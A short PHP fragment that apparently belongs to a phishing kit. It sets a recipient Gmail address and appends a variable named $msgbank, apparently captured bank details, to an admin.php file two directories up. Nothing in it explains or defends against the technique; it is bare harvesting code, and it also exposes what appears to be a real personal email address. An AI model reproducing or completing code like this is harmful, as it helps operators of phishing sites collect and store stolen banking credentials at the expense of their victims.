<?php

$yourmail  = 'roybrown528@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>